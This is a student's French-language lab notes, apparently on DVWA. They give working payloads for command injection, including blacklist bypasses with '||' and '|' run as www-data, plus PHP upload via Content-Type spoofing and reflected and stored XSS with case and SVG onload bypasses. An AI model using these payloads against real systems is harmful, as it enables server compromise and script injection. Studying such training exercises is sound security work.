# NTS

## Command Injection

### Low

ca semble juste être l'output d'une command ping qui run car
`127.0.0.1` renvoie:
```PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.025 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.025 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2997ms
rtt min/avg/max/mdev = 0.012/0.021/0.025/0.006 ms
```
`127.0.0.1 && whoami`
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.025 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.025 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2997ms
rtt min/avg/max/mdev = 0.012/0.021/0.025/0.006 ms
www-data
```
bingo on peut d'ailleur faire un reverse shell car netcat est installé:
`127.0.0.1 && command -v "nc" &>/dev/null;`
renvoie:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.025 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.026 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.029 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2997ms
rtt min/avg/max/mdev = 0.011/0.022/0.029/0.009 ms
/bin/nc
```

### Medium

le `&&` ne marche plus mais en cherchant un peu je me rend compte que `||` fonctionn si l'on fait ratter le ping donc
`|| whoami` renvoie:
```
www-data
```


### High

```php

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
```
sur le code on se rend compte qu'ils ont mis un espace après le | `'| '` donc on a juste à utiliser le | sans espace:

`127.0.0.1 |whoami` renvoie:
```
www-data
```

## File Upload

### Low

upload fichier.php
>> path:
```
http://10.10.120.28/hackable/uploads/file.php
```

### Medium

burp >> Content-Type: image/png

## Reflected XSS

### Low

il prend les balises html en compte 
```
<script>alert("ananas")</script>
```
### Medium

minuscule marche pas => mettre la balise en majuscule
```
<SCRIPT>alert("ananas")</SCRIPT>
```

## JavaScript

### Low

Le flag est chiffré en rot13 puis en md5:
```js
    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }
```
donc on a juste à mettre ce token: `38581812b435834ebf84ebcc2c6424d6`("success" -> rot13-> md5)  et la phrase `success`


## Stored XSS


### Low

balises prisent en compte (mais pas utile pour le Name car nombre char limités)

### Medium

bien bloqué j'ai du lire les docs: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
```
SVG Object Tag¶
<svg/onload=alert('XSS')>
```
dans le name ya pas la place  ```<svg/onloa```
et dans le body ca fait rien cependant on voit qu'il a tenté de load l'image dans le head => tester sur burp (je l'ai pas sur ma machine on verras à epita)

### High
